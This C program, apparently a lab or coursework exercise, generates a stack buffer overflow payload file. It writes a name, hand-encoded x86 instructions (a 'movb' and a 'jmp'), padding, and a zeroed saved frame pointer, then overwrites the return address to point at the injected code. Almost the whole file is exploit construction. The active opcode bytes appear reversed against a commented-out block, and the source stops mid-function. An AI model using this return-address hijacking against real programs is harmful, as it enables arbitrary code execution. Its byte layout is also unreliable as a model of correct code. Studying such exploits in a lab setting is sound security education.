#include <stdio.h>

int main(void) {
	FILE *fptr;	
	int i;

	fptr = fopen("data9", "w");
	if(!fptr) {
		fprintf(stderr, "ERROR: fopen()'s malfunction!\nFile could not open -/- was not created correctly!\nExit code -1\n");
		return -1;
	}else {
		printf("File opened -/- was created successfully!\n");
	}

	
	/* writes "Nikos" (with '\0' included) into the first 6 positions of buf */
	fputc(78, fptr);
	fputc(105, fptr);
	fputc(107, fptr);
	fputc(111, fptr);
	fputc(115, fptr);
	fputc(0, fptr);
	
/*	writes opcode into the next 12 positions of buf 	
	 movb $0x39, 0x80e3068 
	fputc(198, fptr);	
	fputc(5, fptr);
	fputc(104, fptr);
	fputc(48, fptr);
	fputc(14, fptr);
	fputc(8, fptr);
	fputc(57, fptr);
	jmp 0x8049e95 
	fputc(187, fptr);
	fputc(149, fptr);
	fputc(157, fptr);
	fputc(4, fptr);
	fputc(8, fptr);
	fputc(255, fptr);
	fputc(227, fptr);	
*/
	/* movb $0x39, 0x80e3068  */
	fputc(57, fptr);
	fputc(8, fptr);
	fputc(14, fptr);	
	fputc(48, fptr);
	fputc(104, fptr);
	fputc(5, fptr);
	fputc(198, fptr);   

/*      jmp 0x8049e95 */
	fputc(227, fptr);
	fputc(255, fptr);
	fputc(8, fptr);
	fputc(4, fptr);
	fputc(157, fptr);
	fputc(149, fptr);	
	fputc(187, fptr);
	


	/* fills the rest 28 positions of buf with '\0' (0) */
	for(i=0; i<28; i++)
		fputc(0, fptr);	
	
	/* overwrites c with '\0' (0) */
	for(i=0; i<4; i++)
		fputc(0, fptr);
	
	/* i = 55 */	
	fputc(55, fptr);

	/* fills 9 empty bytes with 0 */	
	for(i=0; i<9; i++)
		fputc(0, fptr);

	/* overwrites old ebp with 0 */
	for(i=0; i<4; i++)
		fputc(0, fptr);

	/* overwrites return address with address 0x80e42e6 (address of opcode in data section (starting at 6th position of Name)) */
	fputc(230, fptr);
	fputc(66, fptr);
	fputc(14, fptr);
	fputc(8, fptr);

	/* overwrites s with its original value */
	fputc(224, fptr);
	fputc(66, fptr);
	fputc(14, fptr);
	fputc(8, fptr);


	fclose(fptr);




